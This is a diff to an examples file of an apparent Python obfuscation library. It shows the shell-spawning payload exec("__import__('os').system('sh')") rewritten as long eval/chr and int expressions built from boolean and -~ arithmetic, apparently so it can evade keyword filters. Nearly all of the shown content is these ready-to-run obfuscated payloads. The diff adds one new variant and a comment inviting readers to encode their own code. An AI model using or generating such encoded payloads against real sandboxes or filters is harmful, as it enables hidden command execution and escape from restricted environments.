@@ -8,7 +8,7 @@ FormatManipulation = Encoders.FormatManipulators()
 Examples
 '''
 
-
+# Change this to see what your own code becomes!
 code = '''exec("__import__('os').system('sh')")'''
 
 
@@ -35,10 +35,17 @@ payload = FormatManipulation.format_to_string(code)
 eval('%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s'%('e', 'x', 'e', 'c', '(', '"', '_', '_', 'i', 'm', 'p', 'o', 'r', 't', '_', '_', '(', "'", 'o', 's', "'", ')', '.', 's', 'y', 's', 't', 'e', 'm', '(', "'", 's', 'h', "'", ')', '"', ')'))
 '''
 
-# Encode using chr and format string
+# Encode using chr and format number string
 payload = StringManipulation.string_to_decimal(code)
 payload = StringManipulation.decimal_to_chrs([FormatManipulation.format_to_number(num) for num in payload])
 print(payload)
 '''
 eval(chr(eval('%s%d%s'%(-~0, -(1==0), -~0)))+chr(eval('%d%s%d'%(-~-(1==0), -~-~-(1==0), 0)))+chr(eval('%s%d%d'%(-~0, 0, -~-(1==0))))+chr(eval('%s%d'%(-~-~-~-~-~-~-~-~-~-False, -~-~-~-~-~-~-~-~-~-False)))+chr(eval('%s%d'%(-~-~-~-~-(1==0), 0)))+chr(eval('%d%d'%(-~-~-~-(1==0), -~-~-~-~-(1==0))))+chr(eval('%d%s'%(-~-~-~-~-~-~-~-~-~0, -~-~-~-~-~-(1==0))))+chr(eval('%s%s'%(-~-~-~-~-~-~-~-~-~-(1==0), -~-~-~-~-~0)))+chr(eval('%s%d%d'%(-~-(1==0), -False, -~-~-~-~-~-(1==0))))+chr(eval('%d%d%d'%(-~-False, 0, -~-~-~-~-~-~-~-~-~-False)))+chr(eval('%s%s%d'%(-~-False, -~-(1==0), -~-~0)))+chr(eval('%d%s%d'%(-~0, -~0, -~-(1==0))))+chr(eval('%d%d%d'%(-~-(1==0), -~-False, -~-~-~-~0)))+chr(eval('%d%s%d'%(-~-(1==0), -~-(1==0), -~-~-~-~-~-~-False)))+chr(eval('%s%d'%(-~-~-~-~-~-~-~-~-~-(1==0), -~-~-~-~-~-False)))+chr(eval('%s%s'%(-~-~-~-~-~-~-~-~-~0, -~-~-~-~-~-(1==0))))+chr(eval('%s%s'%(-~-~-~-~-(1==0), -False)))+chr(eval('%s%s'%(-~-~-~-False, -~-~-~-~-~-~-~-~-~-(1==0))))+chr(eval('%d%s%d'%(-~0, -~0, -~-(1==0))))+chr(eval('%d%d%d'%(-~-False, -~-(1==0), -~-~-~-~-~-(1==0))))+chr(eval('%s%d'%(-~-~-~-False, -~-~-~-~-~-~-~-~-~-False)))+chr(eval('%s%d'%(-~-~-~-~-False, -~-(1==0))))+chr(eval('%s%d'%(-~-~-~-~-False, -~-~-~-~-~-~-False)))+chr(eval('%d%d%s'%(-~-(1==0), -~0, -~-~-~-~-~0)))+chr(eval('%d%d%d'%(-~-False, -~-~0, -~-(1==0))))+chr(eval('%s%d%d'%(-~-False, -~-(1==0), -~-~-~-~-~-False)))+chr(eval('%d%s%s'%(-~0, -~0, -~-~-~-~-~-~0)))+chr(eval('%s%s%s'%(-~-False, 0, -~-False)))+chr(eval('%s%d%s'%(-~-False, 0, -~-~-~-~-~-~-~-~-~-False)))+chr(eval('%s%d'%(-~-~-~-~-(1==0), 0)))+chr(eval('%s%s'%(-~-~-~-False, -~-~-~-~-~-~-~-~-~-False)))+chr(eval('%d%d%s'%(-~-(1==0), -~-False, -~-~-~-~-~-(1==0))))+chr(eval('%d%d%d'%(-~-False, -False, -~-~-~-~0)))+chr(eval('%d%d'%(-~-~-~-False, -~-~-~-~-~-~-~-~-~0)))+chr(eval('%d%s'%(-~-~-~-~-(1==0), -~-False)))+chr(eval('%d%s'%(-~-~-~-False, -~-~-~-~-(1==0))))+chr(eval('%d%d'%(-~-~-~-~-False, -~-(1==0)))))
+'''
+
+payload = StringManipulation.string_to_decimal(code)
+payload = StringManipulation.decimal_to_chrs([FormatManipulation.format_to_number(num, evaluate=False) for num in payload], intWrap=True)
+#print(payload)
+'''
+eval(chr(int('%s%s%d'%(-~-False, -False, -~-(1==0))))+chr(int('%d%s%d'%(-~0, -~-~-False, -(1==0))))+chr(int('%s%s%d'%(-~-False, -False, -~-False)))+chr(int('%s%s'%(-~-~-~-~-~-~-~-~-~-(1==0), -~-~-~-~-~-~-~-~-~0)))+chr(int('%d%d'%(-~-~-~-~-(1==0), -(1==0))))+chr(int('%d%s'%(-~-~-~-False, -~-~-~-~0)))+chr(int('%d%d'%(-~-~-~-~-~-~-~-~-~0, -~-~-~-~-~0)))+chr(int('%d%d'%(-~-~-~-~-~-~-~-~-~0, -~-~-~-~-~-False)))+chr(int('%d%s%s'%(-~-False, -False, -~-~-~-~-~-(1==0))))+chr(int('%s%d%d'%(-~-False, -(1==0), -~-~-~-~-~-~-~-~-~-False)))+chr(int('%d%d%s'%(-~0, -~0, -~-~-(1==0))))+chr(int('%d%d%s'%(-~0, -~0, -~-(1==0))))+chr(int('%d%d%d'%(-~0, -~-(1==0), -~-~-~-~-False)))+chr(int('%s%d%d'%(-~-(1==0), -~0, -~-~-~-~-~-~0)))+chr(int('%s%d'%(-~-~-~-~-~-~-~-~-~-False, -~-~-~-~-~-(1==0))))+chr(int('%s%s'%(-~-~-~-~-~-~-~-~-~-False, -~-~-~-~-~0)))+chr(int('%d%s'%(-~-~-~-~0, -(1==0))))+chr(int('%s%d'%(-~-~-~0, -~-~-~-~-~-~-~-~-~0)))+chr(int('%d%d%d'%(-~-False, -~-False, -~-False)))+chr(int('%s%d%d'%(-~0, -~0, -~-~-~-~-~0)))+chr(int('%d%s'%(-~-~-~0, -~-~-~-~-~-~-~-~-~0)))+chr(int('%s%s'%(-~-~-~-~0, -~-False)))+chr(int('%s%d'%(-~-~-~-~0, -~-~-~-~-~-~-(1==0))))+chr(int('%d%s%d'%(-~-False, -~0, -~-~-~-~-~-False)))+chr(int('%s%d%d'%(-~0, -~-~-(1==0), -~-(1==0))))+chr(int('%s%s%s'%(-~-False, -~-False, -~-~-~-~-~-(1==0))))+chr(int('%s%d%d'%(-~-False, -~0, -~-~-~-~-~-~-False)))+chr(int('%s%d%s'%(-~0, -False, -~-(1==0))))+chr(int('%s%s%d'%(-~-False, -(1==0), -~-~-~-~-~-~-~-~-~-(1==0))))+chr(int('%s%d'%(-~-~-~-~0, -(1==0))))+chr(int('%s%s'%(-~-~-~-False, -~-~-~-~-~-~-~-~-~0)))+chr(int('%s%s%s'%(-~-(1==0), -~-(1==0), -~-~-~-~-~-False)))+chr(int('%s%s%d'%(-~0, 0, -~-~-~-~-False)))+chr(int('%s%s'%(-~-~-~0, -~-~-~-~-~-~-~-~-~-False)))+chr(int('%s%d'%(-~-~-~-~0, -~-False)))+chr(int('%d%d'%(-~-~-~-(1==0), -~-~-~-~-(1==0))))+chr(int('%d%d'%(-~-~-~-~0, -~-(1==0)))))
 '''
